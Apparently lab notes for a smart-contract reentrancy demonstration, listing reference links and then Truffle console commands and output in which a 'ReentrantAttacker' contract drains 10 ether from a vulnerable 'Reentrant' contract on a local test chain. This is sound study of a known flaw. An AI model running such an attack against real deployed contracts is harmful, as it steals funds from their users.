https://solidity.readthedocs.io/en/develop/security-considerations.html
https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4
https://github.com/gustavoguimaraes/honeyPotReentranceAttack
http://solidity.readthedocs.io/en/develop/contracts.html
https://ethereum.stackexchange.com/questions/12778/how-to-send-some-amount-to-a-contract-in-truffle

truffle(develop)> Reentrant.deployed().then(instance => honeyPotAddress = instance.address)
'0x9fbda871d559710256a2502a2517b794b482db40'
truffle(develop)> ReentrantAttacker.deployed().then(instance => evilContractAddress = instance.address)
'0x30753e4a8aad7f8597332e813735def5dd395028'
truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)
'0'
truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
'0'

Deposit 5 Ethers from a known account to Reentrant instance:
truffle(develop)> Reentrant.deployed().then(instance => instance.deposit({from: web3.eth.accounts[1], value: web3.toWei(5, "ether") }))
If encounter Error: Invalid number of arguments to Solidity function, delete the contracts in .\build directory, compile and migrate again.

{ tx: '0x678ab27b16d2bd023c4b67c0f6f97f08acd22c05ea2b7a2dfb2b69fc7ae84c53',
  receipt:
   { transactionHash: '0x678ab27b16d2bd023c4b67c0f6f97f08acd22c05ea2b7a2dfb2b69fc7ae84c53',
     transactionIndex: 0,
     blockHash: '0x14179027a3d7c2f737cda6bff3a2778997fbfc397f790c5707761b3b02477ea0',
     blockNumber: 10,
     gasUsed: 41527,
     cumulativeGasUsed: 41527,
     contractAddress: null,
     logs: [] },
  logs: [] }
truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)                                     ))
'5000000000000000000'

ReentrantAttacker instance initially has zero balance:
truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
'0'

Check the withdraw count from Reentrant instance:
truffle(develop)> Reentrant.deployed().then(instance => instance.getWithdrawCount())
BigNumber { s: 1, e: 0, c: [ 0 ] }

Now invoke ReentrantAttacker attack function,
by just sending 5 ethers to deposit in Reentrant instance, and immediately calling withdraw from Reentrant instance,
ReentrantAttacker instance can steal all Ethers (10) from Reentrant
truffle(develop)> ReentrantAttacker.deployed().then(inst => inst.attack({ value: web3.toWei(5, "ether") }))
{ tx: '0xf00c295c0322cfef1eac2ca4d9ca6287f0b99d14471f81b9ae0ac0693e0068f3',
  receipt:
   { transactionHash: '0xf00c295c0322cfef1eac2ca4d9ca6287f0b99d14471f81b9ae0ac0693e0068f3',
     transactionIndex: 0,
     blockHash: '0x1c02c0862c053c70f4045fe2b023217125dfa56044ff445070b9866494bba87b',
     blockNumber: 11,
     gasUsed: 66157,
     cumulativeGasUsed: 66157,
     contractAddress: null,
     logs: [] },
  logs: [] }

Check the withdraw count from Reentrant instance, it has been called twice:
truffle(develop)> Reentrant.deployed().then(instance => instance.getWithdrawCount())
BigNumber { s: 1, e: 0, c: [ 2 ] }

ReentrantAttacker instance now
truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
'10000000000000000000' !!!

truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)                                     ))
'0' !!


